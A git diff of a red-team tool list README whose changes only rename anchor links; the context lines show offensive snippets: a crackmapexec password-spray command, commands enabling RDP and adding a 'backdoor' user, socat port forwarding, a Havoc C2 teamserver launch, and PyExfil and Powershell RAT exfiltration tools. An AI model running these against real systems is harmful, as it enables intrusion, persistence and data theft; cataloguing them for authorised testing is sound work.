 Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.
 
@@ -1173,7 +1277,7 @@ https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11
 Lateral Movement
 ====================
 
-### [🔙](#redteam-tools)[crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)
+### [🔙](#tool-list)[crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)
 
 This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.
 
@@ -1191,7 +1295,7 @@ crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
 
 ![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)
 
-### [🔙](#redteam-tools)Enabling RDP
+### [🔙](#tool-list)Enabling RDP
 
 ```shell
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -1199,7 +1303,7 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 net localgroup "Remote Desktop Users" "backdoor" /add
 ```
 
-### [🔙](#redteam-tools)Upgrading shell to meterpreter
+### [🔙](#tool-list)Upgrading shell to meterpreter
 
 Shells (https://infinitelogins.com/tag/payloads/)
 
@@ -1237,7 +1341,7 @@ Start-Process "shell-name.exe"`
 
 ![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)
 
-### [🔙](#redteam-tools)Forwarding Ports	
+### [🔙](#tool-list)Forwarding Ports	
 
 Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.
 
@@ -1246,7 +1350,7 @@ socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
 socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
 ```
 
-### [🔙](#redteam-tools)Jenkins reverse shell
+### [🔙](#tool-list)Jenkins reverse shell
 
 If you gain access to a jenkins script console you can use this to gain a reverse shell on the node.
 
@@ -1259,7 +1363,7 @@ p.waitFor()
 Collection
 ====================
 
-### [🔙](#redteam-tools)[BloodHound](https://github.com/BloodHoundAD/BloodHound)
+### [🔙](#tool-list)[BloodHound](https://github.com/BloodHoundAD/BloodHound)
 
 An application used to visualize active directory environments. A quick way to visualise attack paths and understand victims' active directory properties.
 
@@ -1273,7 +1377,7 @@ An application used to visualize active directory environments. A quick way to v
 Command and Control
 ====================
 
-### [🔙](#redteam-tools)[Havoc](https://github.com/HavocFramework/Havoc)
+### [🔙](#tool-list)[Havoc](https://github.com/HavocFramework/Havoc)
 
 Havoc is a modern and malleable post-exploitation command and control framework, created by [@C5pider](https://twitter.com/C5pider).
 
@@ -1327,7 +1431,7 @@ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
 Exfiltration
 ====================
 
-### [🔙](#redteam-tools)[PyExfil](https://github.com/ytisf/PyExfil)
+### [🔙](#tool-list)[PyExfil](https://github.com/ytisf/PyExfil)
 
 "An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."
 
@@ -1379,7 +1483,7 @@ ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
 
 ![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)
 
-### [🔙](#redteam-tools)[Powershell RAT](https://github.com/Viralmaniar/Powershell-RAT)
+### [🔙](#tool-list)[Powershell RAT](https://github.com/Viralmaniar/Powershell-RAT)
 
 Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.
 
@@ -1403,4 +1507,4 @@ git clone https://github.com/Viralmaniar/Powershell-RAT
 Impact
 ====================
 
-### [🔙](#redteam-tools)...
+### [🔙](#tool-list)...
